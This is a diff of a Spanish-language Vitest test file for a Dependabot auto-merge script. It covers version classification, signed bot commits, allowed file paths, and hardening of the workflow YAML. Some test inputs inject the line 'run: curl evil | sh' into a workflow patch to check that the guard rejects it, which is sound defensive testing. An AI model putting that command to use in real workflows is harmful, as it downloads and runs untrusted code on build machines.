@@ -4,10 +4,22 @@
 import { readFileSync } from "node:fs";
 import { describe, expect, it } from "vitest";
 
-import { clasificar, commitsDeDependabot, decidir, DECISIONES, linea, motivoFicheros, MOTIVOS, saltoDe } from "./dependabot-auto.mjs";
+import {
+  clasificar,
+  commitsDeDependabot,
+  decidir,
+  DECISIONES,
+  linea,
+  MOTIVOS,
+  revisarFicheros,
+  saltoDe,
+  soloCambiaUses,
+  textoFiable,
+} from "./dependabot-auto.mjs";
 
 const REPO = "pabloam89/MenuPlan";
 const SHA = "a".repeat(40);
+const fixture = (f) => readFileSync(new URL(`./fixtures/${f}`, import.meta.url), "utf8");
 
 const commitBot = (msg = "") => ({
   author: { login: "dependabot[bot]" },
@@ -15,14 +27,25 @@ const commitBot = (msg = "") => ({
   commit: { message: msg, verification: { verified: true, reason: "valid" } },
 });
 const verde = { id: 2, name: "tests", app: { slug: "github-actions" }, head_sha: SHA, status: "completed", conclusion: "success" };
+const npm = [{ filename: "package.json", patch: "x" }, { filename: "package-lock.json", patch: "x" }];
+
+// Un parche real de Dependabot en un workflow fijado por SHA.
+const PARCHE_USES = [
+  "@@ -28,7 +28,7 @@ jobs:",
+  "     steps:",
+  "-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
+  "+      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # v7.1.0",
+  "         with:",
+].join("\n");
+const actions = [{ filename: ".github/workflows/tests.yml", patch: PARCHE_USES }];
 
 function datos(extra = {}) {
   const { pr = {}, ...resto } = extra;
   return {
     repo: REPO,
     pr: {
-      number: 170,
-      title: "chore(deps): bump postcss from 8.5.15 to 8.5.29 in /dish-gallery",
+      number: 165,
+      title: "chore(deps-dev): bump fast-uri from 3.1.6 to 3.1.8",
       body: "",
       user: { login: "dependabot[bot]", type: "Bot" },
       base: { ref: "staging" },
@@ -31,10 +54,9 @@ function datos(extra = {}) {
       ...pr,
     },
     commits: [commitBot()],
-    ficheros: ["dish-gallery/package-lock.json"],
+    ficheros: npm,
     checks: [verde],
     staging: { atrasado: false, ficheros: [], truncado: false },
-    evento: null,
     rebasePedido: false,
     ...resto,
   };
@@ -60,18 +82,71 @@ describe("dependabot-auto: clasificar un PR", () => {
   it("título «from A to B»", () => expect(clasificar({ titulo: "bump postcss from 8.5.15 to 8.5.29" }).tipo).toBe("menor"));
   it("sin versión en el título, la saca del cuerpo", () =>
     expect(clasificar({ titulo: "bump @vitest/mocker and vitest", textos: ["Updates `vitest` from 4.1.7 to 4.1.11\n"] }).tipo).toBe("menor"));
-  it("un grupo con un solo salto mayor en la tabla es mayor", () => {
-    const tabla = "| [eslint](x) | `9.39.4` | `10.12.0` |\n| [pg](x) | `8.23.0` | `8.23.1` |";
-    expect(clasificar({ titulo: "bump the npm-semanal group with 27 updates", textos: [tabla] }).tipo).toBe("mayor");
+
+  // La tabla real de #169 sin las mayores ni las 0.x (que ahora van a npm-cero).
+  const TABLA_169 = [
+    "| [@google/genai](x) | `2.9.0` | `2.27.0` |",
+    "| [@supabase/supabase-js](x) | `2.108.2` | `2.117.2` |",
+    "| [@upstash/redis](x) | `1.38.0` | `1.39.0` |",
+    "| [@vercel/functions](x) | `3.9.9` | `3.9.11` |",
+    "| [papaparse](x) | `5.5.3` | `5.7.0` |",
+    "| [pdfjs-dist](x) | `6.3.289` | `6.4.299` |",
+    "| [react](x) | `19.2.4` | `19.3.0` |",
+    "| [@types/react](x) | `19.2.14` | `19.3.0` |",
+    "| [react-dom](x) | `19.2.4` | `19.3.0` |",
+    "| [@types/react-dom](x) | `19.2.3` | `19.3.0` |",
+    "| [zod](x) | `4.4.3` | `4.6.5` |",
+    "| [@remotion/cli](x) | `4.0.520` | `4.0.533` |",
+    "| [@remotion/google-fonts](x) | `4.0.520` | `4.0.533` |",
+    "| [@vercel/blob](x) | `2.4.1` | `2.8.1` |",
+    "| [@vitejs/plugin-react](x) | `6.0.1` | `6.1.2` |",
+    "| [eslint-plugin-react-hooks](x) | `7.0.1` | `7.1.1` |",
+    "| [globals](x) | `17.4.0` | `17.13.0` |",
+    "| [pg](x) | `8.23.0` | `8.23.1` |",
+    "| [remotion](x) | `4.0.520` | `4.0.533` |",
+    "| [vite](x) | `8.2.2` | `8.3.3` |",
+  ].join("\n");
+  const TITULO_MENORES = "chore(deps): bump the npm-menores group across 1 directory with 20 updates";
+  it("la tabla real de #169, sin mayores ni 0.x, es menor", () =>
+    expect(clasificar({ titulo: TITULO_MENORES, textos: [`Bumps the npm-menores group with 20 updates:\n\n${TABLA_169}`] }).tipo).toBe("menor"));
+  it("con una fila mayor en la tabla, mayor", () => {
+    const tabla = `${TABLA_169}\n| [eslint](x) | \`9.39.4\` | \`10.12.0\` |`;
+    expect(clasificar({ titulo: TITULO_MENORES, textos: [tabla] }).tipo).toBe("mayor");
   });
-  it("el grupo -menores cuenta como menor, salvo que una versión 0.x lo desmienta", () => {
-    expect(clasificar({ titulo: "bump the npm-menores group across 1 directory with 5 updates" }).tipo).toBe("menor");
-    expect(clasificar({ titulo: "bump the npm-menores group", textos: ["Updates `x` from 0.3.1 to 0.4.0"] }).tipo).toBe("mayor");
+  it("una 0.x que Dependabot llama minor sigue siendo mayor", () =>
+    expect(clasificar({ titulo: TITULO_MENORES, textos: ["Updates `@anthropic-ai/sdk` from 0.129.0 to 0.131.0"] }).tipo).toBe("mayor"));
+  it("el grupo -menores sin versiones legibles cuenta como menor", () =>
+    expect(clasificar({ titulo: "bump the npm-menores group across 1 directory with 5 updates" }).tipo).toBe("menor"));
+  it("-mayores es mayor; npm-cero (u otro grupo) lo mira una sesión", () => {
+    expect(clasificar({ titulo: "bump the npm-mayores group with 2 updates" }).tipo).toBe("mayor");
+    expect(clasificar({ titulo: "bump the npm-cero group with 1 update", textos: ["Updates `sharp` from 0.35.3 to 0.35.5"] }).tipo).toBe("grupo-manual");
   });
-  it("el grupo -mayores es mayor siempre", () => expect(clasificar({ titulo: "bump the npm-mayores group with 2 updates" }).tipo).toBe("mayor"));
   it("sin versiones ni grupo, no se sabe", () => expect(clasificar({ titulo: "bump baseline-browser-mapping in /dish-gallery" }).tipo).toBe("desconocida"));
   it("el punto final de una frase no corta la versión", () =>
     expect(clasificar({ titulo: "x", textos: ["Bumps [a](u) from 1.2.1 to 2.0.0."] }).tipo).toBe("mayor"));
+
+  describe("con el PR real #110 (actions, dos mayores)", () => {
+    const titulo = "chore(ci): Bump the actions-semanal group across 1 directory with 2 updates";
+    const cuerpo = fixture("dependabot-pr110-cuerpo.md");
+    const commit = fixture("dependabot-pr110-commit.txt");
+    it("las notas de versión (<details>) no cuentan: 2 pares, no 19", () => {
+      expect(clasificar({ titulo, textos: [cuerpo] }).pares).toEqual([["4", "7"], ["4", "6"]]);
+      expect(textoFiable(cuerpo)).not.toMatch(/Release notes|<\/?details>/);
+    });
+    it("el update-type del commit manda: dos semver-major", () => expect(clasificar({ titulo, textos: [commit] }).metadatos).toEqual(["mayor", "mayor"]));
+    it("y se queda (grupo que no es -menores, y además mayor)", () => {
+      const r = clasificar({ titulo: titulo.replace("actions-semanal", "actions-menores"), textos: [cuerpo, commit] });
+      expect(r.tipo).toBe("mayor");
+    });
+  });
+  it("update-type menor manda sobre un texto que no se lee (un SHA)", () => {
+    const yml = "---\nupdated-dependencies:\n- dependency-name: actions/checkout\n  update-type: version-update:semver-minor\n...";
+    expect(clasificar({ titulo: "bump actions/checkout from 3d3c42e to 0123456", textos: [yml] }).tipo).toBe("menor");
+  });
+  it("update-type menor pero el texto dice mayor: gana mayor", () => {
+    const yml = "update-type: version-update:semver-minor";
+    expect(clasificar({ titulo: "bump x from 0.3.1 to 0.4.0", textos: [yml] }).tipo).toBe("mayor");
+  });
 });
 
 describe("dependabot-auto: quién y qué", () => {
@@ -85,29 +160,54 @@ describe("dependabot-auto: quién y qué", () => {
     expect(commitsDeDependabot([{ ...commitBot(), committer: { login: "pabloam89" } }])).toBe(false));
   it("del bot y por web-flow, pero sin firma válida: no", () =>
     expect(commitsDeDependabot([{ ...commitBot(), commit: { verification: { verified: true, reason: "unknown_key" } } }])).toBe(false));
-  it("solo package.json y package-lock.json", () => {
-    expect(motivoFicheros(["package.json", "package-lock.json"])).toBe(null);
-    expect(motivoFicheros([".github/workflows/tests.yml"])).toBe("toca-workflows");
-    expect(motivoFicheros(["package-lock.json", "scripts/x.mjs"])).toBe("ficheros-fuera");
-    expect(motivoFicheros([])).toBe("ficheros-fuera");
+
+  it("npm: solo package.json y package-lock.json de la raíz", () => {
+    expect(revisarFicheros(npm)).toEqual({ ruta: "npm", motivo: null });
+    expect(revisarFicheros([{ filename: "dish-gallery/package.json" }]).motivo).toBe("ficheros-fuera");
+    expect(revisarFicheros([{ filename: "dish-gallery/package-lock.json" }, ...npm]).motivo).toBe("ficheros-fuera");
+    expect(revisarFicheros([{ filename: "package-lock.json" }, { filename: "scripts/x.mjs" }]).motivo).toBe("ficheros-fuera");
+    expect(revisarFicheros([]).motivo).toBe("ficheros-fuera");
+  });
+  it("actions: solo .github/workflows/*.yml, y npm y actions a la vez no", () => {
+    expect(revisarFicheros(actions)).toEqual({ ruta: "actions", motivo: null });
+    expect(revisarFicheros([{ filename: ".github/workflows/sub/x.yml", patch: PARCHE_USES }]).motivo).toBe("ficheros-fuera");
+    expect(revisarFicheros([{ filename: ".github/dependabot.yml", patch: PARCHE_USES }]).motivo).toBe("ficheros-fuera");
+    expect(revisarFicheros([...actions, ...npm]).motivo).toBe("ficheros-fuera");
+  });
+  it("actions: si cambia algo más que una línea uses:, no", () => {
+    expect(soloCambiaUses(PARCHE_USES)).toBe(true);
+    expect(soloCambiaUses(`${PARCHE_USES}\n-        run: npm ci\n+        run: curl evil | sh`)).toBe(false);
+    expect(soloCambiaUses(`${PARCHE_USES}\n+        run: curl evil | sh`)).toBe(false);
+    expect(soloCambiaUses(PARCHE_USES.replace("+      - uses: actions/checkout@", "+      - uses: otro/checkout@"))).toBe(false);
+    expect(soloCambiaUses(PARCHE_USES.replace("# v7.1.0", "# v7.1.0\n+        with: { ref: x }"))).toBe(false);
+    expect(soloCambiaUses(undefined)).toBe(false); // sin parche (fichero enorme): no
+    expect(revisarFicheros([{ filename: ".github/workflows/tests.yml", patch: "@@\n-x: 1\n+x: 2" }]).motivo).toBe("cambia-mas-que-uses");
   });
 });
 
 describe("dependabot-auto: decidir", () => {
   const motivo = (d) => decidir(datos(d)).motivo;
-  it("el caso bueno se fusiona", () => expect(decidir(datos())).toMatchObject({ decision: "fusionado", motivo: "-", tipo: "menor" }));
+  it("el caso bueno de npm se fusiona", () => expect(decidir(datos())).toMatchObject({ decision: "fusionado", motivo: "-", tipo: "menor", ruta: "npm" }));
+  it("el de actions, con las mismas comprobaciones, queda como fusionable por la ruta actions", () => {
+    const pr = { title: "chore(ci): bump the actions-menores group with 1 update", body: "Updates `actions/checkout` from 7.0.0 to 7.1.0" };
+    expect(decidir(datos({ pr, ficheros: actions }))).toMatchObject({ decision: "fusionado", ruta: "actions" });
+    expect(decidir(datos({ pr, ficheros: actions, commits: [{ ...commitBot(), author: { login: "algbarc" } }] })).motivo).toBe("commits-ajenos");
+    expect(decidir(datos({ pr, ficheros: actions, checks: [{ ...verde, head_sha: "b".repeat(40) }] })).motivo).toBe("tests-no-verde");
+  });
   it("abierto por otro: no", () => expect(motivo({ pr: { user: { login: "dependabot[bot]", type: "User" } } })).toBe("autor"));
   it("contra main: no", () => expect(motivo({ pr: { base: { ref: "main" } } })).toBe("base"));
   it("desde un fork: no", () => expect(motivo({ pr: { head: { sha: SHA, repo: { full_name: "otro/MenuPlan" } } } })).toBe("rama-ajena"));
   it("con un commit ajeno: no", () => expect(motivo({ commits: [commitBot(), { ...commitBot(), author: { login: "algbarc" } }] })).toBe("commits-ajenos"));
-  it("mayor: se queda", () => expect(motivo({ pr: { title: "bump vite from 5.4.21 to 8.3.4 in /dish-gallery" } })).toBe("mayor"));
-  it("tests en rojo, o en verde pero de otro SHA: no", () => {
+  it("en dish-gallery: no", () =>
+    expect(motivo({ pr: { title: "bump postcss from 8.5.15 to 8.5.29 in /dish-gallery" }, ficheros: [{ filename: "dish-gallery/package-lock.json" }] })).toBe("ficheros-fuera"));
+  it("mayor: se queda", () => expect(motivo({ pr: { title: "bump vite from 5.4.21 to 8.3.4" } })).toBe("mayor"));
+  it("grupo npm-cero: se queda", () => expect(motivo({ pr: { title: "bump the npm-cero group with 1 update" } })).toBe("grupo-manual"));
+  it("tests en rojo, o en verde pero de otro SHA (un run viejo): no", () => {
     expect(motivo({ checks: [{ ...verde, conclusion: "failure" }] })).toBe("tests-no-verde");
     expect(motivo({ checks: [{ ...verde, head_sha: "b".repeat(40) }] })).toBe("tests-no-verde");
     expect(motivo({ checks: [verde, { ...verde, id: 3, conclusion: "failure" }] })).toBe("tests-no-verde");
     expect(motivo({ checks: [] })).toBe("tests-no-verde");
   });
-  it("el run que lo lanzó es de un SHA viejo: no", () => expect(motivo({ evento: { headSha: "b".repeat(40), prs: [170] } })).toBe("tests-otro-sha"));
   it("con conflicto, o sin calcular: no", () => {
     expect(motivo({ pr: { mergeable: false } })).toBe("conflicto");
     expect(motivo({ pr: { mergeable: null } })).toBe("mergeable-desconocido");
@@ -115,16 +215,15 @@ describe("dependabot-auto: decidir", () => {
   it("atrasado sin pisar sus ficheros: se fusiona", () =>
     expect(decidir(datos({ staging: { atrasado: true, ficheros: ["src/a.js"], truncado: false } })).decision).toBe("fusionado"));
   it("atrasado y staging tocó sus ficheros: pide rebase, una vez", () => {
-    const staging = { atrasado: true, ficheros: ["dish-gallery/package-lock.json"], truncado: false };
+    const staging = { atrasado: true, ficheros: ["package-lock.json"], truncado: false };
     expect(decidir(datos({ staging })).decision).toBe("rebase");
     expect(decidir(datos({ staging, rebasePedido: true })).motivo).toBe("rebase-ya-pedido");
     expect(decidir(datos({ staging: { atrasado: true, ficheros: [], truncado: true } })).decision).toBe("rebase");
   });
   it("cada línea usa el vocabulario cerrado", () => {
-    const l = linea({ pr: 170, ...decidir(datos()) });
-    expect(l).toBe("dependabot-auto pr: 170 decision: fusionado motivo: - tipo: menor");
+    expect(linea({ pr: 165, ...decidir(datos()) })).toBe("dependabot-auto pr: 165 decision: fusionado motivo: - tipo: menor ruta: npm");
     const fuente = readFileSync(new URL("./dependabot-auto.mjs", import.meta.url), "utf8");
-    for (const m of fuente.matchAll(/espera\("([\w-]+)"/g)) expect(MOTIVOS).toContain(m[1]);
+    for (const m of fuente.matchAll(/(?:espera\(|motivo: )"([\w-]+)"/g)) expect(MOTIVOS).toContain(m[1]);
     for (const m of fuente.matchAll(/decision: "([\w-]+)"/g)) expect(DECISIONES).toContain(m[1]);
   });
 });
@@ -132,14 +231,15 @@ describe("dependabot-auto: decidir", () => {
 describe("dependabot-auto.yml: no abre la puerta al PR", () => {
   const yml = readFileSync(new URL("../.github/workflows/dependabot-auto.yml", import.meta.url), "utf8");
   const sinComentarios = yml.replace(/\s#.*$/gm, "");
+  const pasos = sinComentarios.split(/\n {6}- /).slice(1);
 
-  it("solo workflow_run de Tests y a mano; nunca pull_request_target", () => {
+  it("solo workflow_run de Tests, programado y a mano; nunca pull_request_target", () => {
     expect(sinComentarios).not.toMatch(/pull_request_target/);
     expect(sinComentarios).toMatch(/workflow_run:\s*\n\s*workflows: \[Tests\]/);
   });
   it("cada acción fijada por SHA", () => {
     const usos = [...sinComentarios.matchAll(/uses:\s*(\S+)/g)].map((m) => m[1]);
-    expect(usos.length).toBeGreaterThan(0);
+    expect(usos).toHaveLength(2);
     for (const u of usos) expect(u).toMatch(/@[0-9a-f]{40}$/);
   });
   it("el único checkout es de la rama por defecto, sin credenciales y solo del script", () => {
@@ -155,17 +255,51 @@ describe("dependabot-auto.yml: no abre la puerta al PR", () => {
     const permisos = job.trim().split("\n").map((l) => l.trim()).sort();
     expect(permisos).toEqual(["checks: read", "contents: write", "pull-requests: write"]);
   });
-  it("no usa secretos: solo el token del workflow", () => expect(sinComentarios).not.toMatch(/secrets\./));
+  it("la clave de la App solo entra en el paso del token, que solo corre con un PR de actions apuntado", () => {
+    const conClave = pasos.filter((p) => /secrets\.DEPENDABOT_APP_KEY\b(?! != '')/.test(p));
+    expect(conClave).toHaveLength(1);
+    expect(conClave[0]).toMatch(/uses: actions\/create-github-app-token@[0-9a-f]{40}/);
+    expect(conClave[0]).toMatch(/if: steps\.pasada\.outputs\.app_pr != ''/);
+    // con los tres permisos justos, nada más
+    expect([...conClave[0].matchAll(/permission-([\w-]+): (\w+)/g)].map((m) => `${m[1]}: ${m[2]}`).sort()).toEqual([
+      "contents: write",
+      "pull-requests: write",
+      "workflows: write",
+    ]);
+    // el token de la App solo lo ve el paso que fusiona el de actions
+    const conToken = pasos.filter((p) => p.includes("steps.app.outputs.token"));
+    expect(conToken).toHaveLength(1);
+    expect(conToken[0]).toMatch(/if: steps\.pasada\.outputs\.app_pr != ''/);
+    expect(conToken[0]).toMatch(/--fusionar-app/);
+    // el resto de secretos: ninguno
+    expect([...sinComentarios.matchAll(/secrets\.(\w+)/g)].map((m) => m[1]).every((s) => s === "DEPENDABOT_APP_KEY")).toBe(true);
+  });
+  it("con el environment dependabot-auto (sus secretos solo existen en staging)", () =>
+    expect(sinComentarios).toMatch(/^ {4}environment: dependabot-auto$/m));
 });
 
-describe("dependabot.yml: lo pequeño y lo grande, por separado", () => {
+describe("dependabot.yml: lo pequeño, lo grande y las 0.x, por separado", () => {
   const yml = readFileSync(new URL("../.github/dependabot.yml", import.meta.url), "utf8");
+  const pkg = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8"));
   it("cada ecosistema con su grupo -menores (minor y patch) y -mayores (major)", () => {
     for (const eco of ["npm", "actions"]) {
       expect(yml).toMatch(new RegExp(`${eco}-menores:\\n(?: {8}.*\\n)*? {8}update-types: \\[minor, patch\\]`));
       expect(yml).toMatch(new RegExp(`${eco}-mayores:\\n(?: {8}.*\\n)*? {8}update-types: \\[major\\]`));
     }
   });
+  it("cada dependencia directa en 0.x va a npm-cero y fuera de menores y mayores", () => {
+    const cero = Object.entries({ ...pkg.dependencies, ...pkg.devDependencies })
+      .filter(([, v]) => /^[\^~]?0\./.test(v))
+      .map(([n]) => n)
+      .sort();
+    expect(cero.length).toBeGreaterThan(0);
+    const lista = (re) => JSON.parse(re.exec(yml)?.[1] ?? "[]").sort();
+    expect(lista(/npm-cero:\n(?: {8}.*\n)*? {8}patterns: (\[.*\])/)).toEqual(cero);
+    expect(lista(/npm-menores:\n(?: {8}.*\n)*? {8}exclude-patterns: (\[.*\])/)).toEqual(cero);
+    expect(lista(/npm-mayores:\n(?: {8}.*\n)*? {8}exclude-patterns: (\[.*\])/)).toEqual(cero);
+    expect(yml.indexOf("npm-cero:")).toBeLessThan(yml.indexOf("npm-menores:"));
+  });
+  it("cooldown de 5 días en cada ecosistema", () => expect(yml.match(/cooldown:\n {6}default-days: 5\n/g)).toHaveLength(2));
   it("todo contra staging", () => {
     const ramas = [...yml.matchAll(/target-branch: (\S+)/g)].map((m) => m[1]);
     expect(ramas).toEqual(["staging", "staging"]);
